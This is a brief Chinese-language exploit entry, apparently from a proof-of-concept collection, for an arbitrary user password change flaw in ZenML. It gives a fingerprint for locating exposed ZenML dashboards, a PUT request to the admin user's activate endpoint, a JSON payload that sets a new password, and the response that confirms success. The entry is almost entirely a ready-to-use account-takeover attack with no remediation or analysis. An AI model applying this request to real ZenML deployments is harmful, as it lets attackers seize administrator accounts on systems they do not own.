# ZenML任意用户密码修改漏洞

ZenML ｜ 其他 ｜ —
- **指纹**：`title=="ZenML - Dashboard"`
- **请求**：`PUT /api/v1/users/admin/activate HTTP/1.1`

**Payload**
```
{"password": "dudesite@123"}
```
- **响应特征**：200 updated